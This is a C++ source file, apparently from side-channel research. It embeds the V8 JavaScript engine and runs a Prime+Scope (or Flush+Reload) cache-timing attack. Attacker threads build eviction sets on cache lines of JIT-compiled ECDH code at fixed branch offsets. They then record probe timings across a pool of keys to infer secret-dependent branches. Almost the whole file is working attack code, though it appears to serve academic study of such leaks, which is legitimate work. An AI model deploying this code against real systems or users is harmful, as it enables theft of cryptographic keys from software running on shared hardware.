#include <assert.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <cstdint>
#include <cstdlib>

#include "v8_runtime.h"

extern "C" {
#include "arch.h"
#include "config.h"
#include "log.h"
#include "fs.h"
#include "flush_reload.h"
#include "prime_probe.h"
}

static const char *test_name = "v8_ecdh_key_pool";
static char dump_dir[256];
uintptr_t jit_func, jit_machine_code;
uint64_t ecdh_false_branch_offset = 0x1a6a, ecdh_true_branch_offset = 0x1b7a;
static const int max_exec_cycles = (int)1e8;
enum { cache_line_count = 3, profile_samples = 1 << 16 };
static uint64_t probe_time_arr[cache_line_count][profile_samples];
static uint64_t sample_tsc_arr[cache_line_count][profile_samples];
static uint64_t *sample_tsc[cache_line_count];
static uint64_t *probe_time[cache_line_count];
static uint64_t *reload_time[cache_line_count];
enum AttackPrimitive {
	FLUSH_RELOAD,
	PRIME_SCOPE,
};

const char *ec_key_pool_rpath = "experiments/v8_ecdh/ec_key_pool";
static enum AttackPrimitive attack_primitive = PRIME_SCOPE;

const int victim_runs = 100;
const int key_num = 100;

static pthread_barrier_t attacker_local_barrier;

static uint64_t cl_offset[3] = { 0x1b7a + CACHE_LINE_SIZE * 5,
	                             0x1a6a + CACHE_LINE_SIZE * 3,
	                             0x1b7a + CACHE_LINE_SIZE * 3 };
uintptr_t target_addr[3] = {};
static EVSet *evsets[3];
static int retry = 16;

void *v8_attacker_thread(void *param) {
	// EVSet* evset = *(EVSet**)param;
	int32_t slot = *(int32_t *)param;
	log_info("attacker thread %d prepare", slot);
	log_info("attacker check value %p",
	         *(uint64_t *)(uintptr_t)jit_machine_code);

	helper_thread_ctrl hctrl;
	if (start_helper_thread(&hctrl)) {
		_error("Failed to start helper!\n");
		return 0;
	}

	log_info("attacker build evset");
	EVSet *evset = evsets[slot];

	log_info("attacker thread %d target address %p", slot, target_addr[slot]);

	uint8_t *scope = evset->addrs[0];
	evchain *sf_chain = evchain_build(evset->addrs, SF_ASSOC);
	i64 threshold = detected_cache_lats.l2_thresh;

	u64 tsc0, tsc1, end, scope_lat;
	u32 aux, index = 0;

	pthread_barrier_wait(sync_ctx.barrier);
	log_info("attacker thread start");

	for (int i = 0; i < key_num; ++i) {
		for (int j = 0; j < victim_runs; ++j) {
			prime_skx_sf_evset_ps_flush(
			    evset, sf_chain, array_repeat, l2_repeat);

			if (slot == 0) {
				pthread_barrier_wait(sync_ctx.barrier);
			}
			pthread_barrier_wait(&attacker_local_barrier);

			tsc0 = tsc1 = rdtscp();
			index = 0;
			do {
				tsc1 = rdtscp();

				scope_lat = _time_maccess_aux(scope, end, aux);
				int scope_evict = scope_lat > threshold &&
				                  scope_lat <
				                      detected_cache_lats.interrupt_thresh;
				if (scope_lat > threshold) {
					if (scope_lat < detected_cache_lats.interrupt_thresh) {
						probe_time[slot][index] = scope_lat;
						sample_tsc[slot][index] = tsc1;
						index++;
					}
					prime_skx_sf_evset_ps_flush(
					    evset, sf_chain, array_repeat, l2_repeat);
				}
			} while (tsc1 - tsc0 < max_exec_cycles && index < profile_samples);

			log_info("Key %d slot %d find %d hits", i, slot, index);
			if (slot == 0) {
				snprintf(
				    dump_dir, sizeof(dump_dir), "%s_key%05d", test_name, i);
				dump_profiling_traces(dump_dir,
				                      victim_runs,
				                      sample_tsc,
				                      probe_time,
				                      cache_line_count,
				                      profile_samples,
				                      j == 0);
			}
			pthread_barrier_wait(&attacker_local_barrier);
		}
	}
	stop_helper_thread(&hctrl);
	return NULL;
}

int v8_run(int argc, char *argv[]) {
	reset_sync_ctx(V8_PROJ_ID);

	v8::V8::SetFlagsFromCommandLine(&argc, argv, true);
	// Initialize V8.
	v8::V8::InitializeICUDefaultLocation(argv[0]);
	// v8::V8::InitializeExternalStartupData(argv[0]);
	std::unique_ptr<v8::Platform> platform = v8::platform::NewDefaultPlatform();
	v8::V8::InitializePlatform(platform.get());
	v8::V8::Initialize();

	// Create a new Isolate and make it the current one.
	v8::Isolate::CreateParams create_params;
	create_params.array_buffer_allocator =
	    v8::ArrayBuffer::Allocator::NewDefaultAllocator();
	v8::Isolate *isolate = v8::Isolate::New(create_params);
	{
		v8::Isolate::Scope iscope(isolate);

		// Create a stack-allocated handle scope.
		v8::HandleScope scope(isolate);

		// Create a new context.

		v8::TryCatch try_catch(isolate);

		v8::Local<v8::ObjectTemplate> global = v8::ObjectTemplate::New(isolate);
		global->Set(
		    isolate, "rdtscp", v8::FunctionTemplate::New(isolate, Rdtscp));
		global->Set(isolate, "read", v8::FunctionTemplate::New(isolate, Read));
		global->Set(isolate,
		            "readbuffer",
		            v8::FunctionTemplate::New(isolate, ReadBuffer));
		global->Set(
		    isolate, "print", v8::FunctionTemplate::New(isolate, Print));
		v8::Local<v8::Context> context =
		    v8::Context::New(isolate, nullptr, global);

		// Enter the context for compiling and running the hello world script.
		v8::Context::Scope cscope(context);

		{
			const char *source_str = read_file(argv[1]);
			const char *repeat_str = read_file(argv[2]);
			const char *set_keypair_template = read_file(argv[3]);

			log_trace("source: %s\n", source_str);
			log_trace("repeat: %s\n", repeat_str);

			// Create a string containing the JavaScript source code.
			v8::Local<v8::String> source =
			    v8::String::NewFromUtf8(isolate, source_str).ToLocalChecked();

			// Compile the source code.
			v8::Local<v8::Script> script =
			    v8::Script::Compile(context, source).ToLocalChecked();

			// Run the script to get the result.
			v8::Local<v8::Value> result = script->Run(context).ToLocalChecked();

			{
				v8::Local<v8::String> repeat_src =
				    v8::String::NewFromUtf8(isolate, repeat_str)
				        .ToLocalChecked();

				v8::Local<v8::Script> repeat_script =
				    v8::Script::Compile(context, repeat_src).ToLocalChecked();

				v8::Local<v8::Value> repeat_script_result =
				    repeat_script->Run(context).ToLocalChecked();

				v8::Local<v8::Function> repeat_func =
				    repeat_script_result.As<v8::Function>();

				log_info("v8 runtime jit warmup");
				int jit_cnt = 1000;
				for (int i = 0; i < jit_cnt; ++i) {
					v8::MaybeLocal<v8::Value> maybe_result =
					    repeat_func
					        ->Call(context, context->Global(), 0, nullptr)
					        .ToLocalChecked();
					v8::Local<v8::Value> result;
					if (!maybe_result.ToLocal(&result)) {
						v8::String::Utf8Value error(isolate,
						                            try_catch.Exception());
						log_error("JIT warmup script error: %s\n",
						          *error ? *error : "unknown error");
					}
				}

				log_info("\n\n");

				log_info("Provide jit function address:");
				if (scanf("%lx", &jit_func) == 1) {
					log_info("Read jit function address %p", jit_func);
				} else {
					log_error("Error reading jit_func\n");
					exit(1);
				}

				_Z25_v8_internal_Print_ObjectPv((void *)jit_func);

				if (scanf("%lx", &jit_func) == 1) {
					log_info("Read jit core address %p", jit_func);
				} else {
					log_error("Error reading jit_func\n");
					exit(1);
				}

				_Z25_v8_internal_Print_ObjectPv((void *)jit_func);

				log_info("Provide jit machine code address:");
				if (scanf("%lx", &jit_machine_code) == 1) {
					log_info("Read jit machine code address %p",
					         jit_machine_code);
				} else {
					log_error("Error reading jit_machine_code\n");
					exit(1);
				}

				if (cache_env_init(1)) {
					_error("Failed to initialize cache env!\n");
					return 0;
				}

				helper_thread_ctrl hctrl;
				if (start_helper_thread(&hctrl)) {
					_error("Failed to start helper!\n");
					return 0;
				}

				for (int i = 0; i < cache_line_count; ++i) {
					target_addr[i] = jit_machine_code + cl_offset[i];
					log_info("cl%d : %p", i, target_addr[i]);
					evsets[i] = NULL;
					for (int r = 0; r < retry && evsets[i] == NULL; ++r) {
						evsets[i] =
						    prepare_evsets((u8 *)target_addr[i], &hctrl);
					}
					if (evsets[i] == NULL) {
						log_error("failed to build evset");
						exit(1);
					}
				}

				stop_helper_thread(&hctrl);
				// assert(*(uint64_t*)jit_machine_code == 0x48fffffff91d8d48);

				for (int i = 0; i < cache_line_count; ++i) {
					sample_tsc[i] = sample_tsc_arr[i];
					probe_time[i] = probe_time_arr[i];
				}

				pthread_t thread_attacker = 0;
				uint32_t slot0 = 0, slot1 = 1, slot2 = 2;
				pthread_barrier_init(
				    &attacker_local_barrier, NULL, cache_line_count);
				int err;
				err = pthread_create(
				    &thread_attacker, NULL, v8_attacker_thread, &slot0);
				err = pthread_create(
				    &thread_attacker, NULL, v8_attacker_thread, &slot1);
				err = pthread_create(
				    &thread_attacker, NULL, v8_attacker_thread, &slot2);

				log_info("V8 check value %p",
				         *(uint64_t *)(uintptr_t)jit_machine_code);
				log_info("V8 wait attacker");
				pthread_barrier_wait(sync_ctx.barrier);
				log_info("V8 start eval func");
				for (int i = 0; i < key_num; ++i) {
					char set_keypair_str[4096];
					char ec_key_pool_path[256];
					sprintf(ec_key_pool_path,
					        "%s/%s",
					        get_config()->project_root,
					        ec_key_pool_rpath);
					sprintf(set_keypair_str,
					        set_keypair_template,
					        ec_key_pool_path,
					        i);

					log_debug("set key script: %s", set_keypair_str);
					v8::Local<v8::String> set_keypair_src =
					    v8::String::NewFromUtf8(isolate, set_keypair_str)
					        .ToLocalChecked();

					v8::Local<v8::Script> set_keypair_script =
					    v8::Script::Compile(context, set_keypair_src)
					        .ToLocalChecked();

					v8::MaybeLocal<v8::Value> maybe_result =
					    set_keypair_script->Run(context);
					v8::Local<v8::Value> result;
					if (!maybe_result.ToLocal(&result)) {
						v8::String::Utf8Value error(isolate,
						                            try_catch.Exception());
						log_error("Set key pair script failed: %s\n",
						          *error ? *error : "unknown error");
						log_error("set_keypair_str:\n%s", set_keypair_str);
					}

					for (int j = 0; j < 10; ++j) {
						maybe_result = repeat_func->Call(
						    context, context->Global(), 0, nullptr);
						if (!maybe_result.ToLocal(&result)) {
							v8::String::Utf8Value error(isolate,
							                            try_catch.Exception());
							log_error("Repeat script failed: %s\n",
							          *error ? *error : "unknown error");
						}
					}
					for (int j = 0; j < victim_runs; ++j) {
						pthread_barrier_wait(sync_ctx.barrier);
						maybe_result = repeat_func->Call(
						    context, context->Global(), 0, nullptr);

						if (!maybe_result.ToLocal(&result)) {
							v8::String::Utf8Value error(isolate,
							                            try_catch.Exception());
							log_error("Repeat script failed: %s\n",
							          *error ? *error : "unknown error");
						}
					}
					sleep(1);
				}
				pthread_join(thread_attacker, NULL);
			}
		}
	}
	// Dispose the isolate and tear down V8.
	isolate->Dispose();
	v8::V8::Dispose();
	v8::V8::DisposePlatform();
	delete create_params.array_buffer_allocator;
	return 0;
}

int main(int argc, char *argv[]) {
	if (argc == 1) {
		log_error("Eval file not provided");
		return 1;
	} else if (argc == 2) {
		log_error("Repeat file not provided");
		return 1;
	} else if (argc == 3) {
		log_error("keypair template not provided");
		return 1;
	} else {
		return v8_run(argc, argv);
	}
	return 0;
}
